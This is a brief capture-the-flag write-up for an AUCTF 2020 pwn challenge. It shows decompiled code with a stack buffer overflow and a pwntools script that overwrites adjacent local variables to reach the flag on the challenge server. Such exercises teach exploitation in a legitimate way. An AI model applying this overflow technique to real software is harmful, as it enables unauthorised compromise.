# Thanksgiving Dinner
> LongChampion, 06/04/2020

## Challenge
Well, look at `vulnerable` function:
```cpp
char *vulnerable()
{
  char *result; // eax
  char s; // [esp+Ch] [ebp-2Ch]
  int A; // [esp+1Ch] [ebp-1Ch]
  int B; // [esp+20h] [ebp-18h]
  int C; // [esp+24h] [ebp-14h]
  int D; // [esp+28h] [ebp-10h]
  int E; // [esp+2Ch] [ebp-Ch]

  puts("Hey I heard you are searching for flags! Well I've got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that's all I got!\n");
  E = 0;
  D = 10;
  C = 20;
  B = 20;
  A = 2;
  result = fgets(&s, 0x24, stdin);
  if ( E == 0x1337 && D < (signed int)0xFFFFFFEC && B != 0x14 && C == 0x667463 && A == 0x2A )
    print_flag();
  return result;
}
```
Too easy, just overwrite `A`, `B`, `C`, `D` and `E` with appropriate value to get the flag.

## Solution
```python
#!/usr/bin/env python2

from pwn import *
context.binary = "./turkey"

r = remote("challenges.auctf.com", 30011)
payload = 'A'*0x10 + p32(0x2a) + p32(0x15) + \
    p32(0x667463) + p32(0xFFFFFFEC-1) + p32(0x1337)
r.sendlineafter("Sorry that's all I got!", payload)
print r.recvall()
```
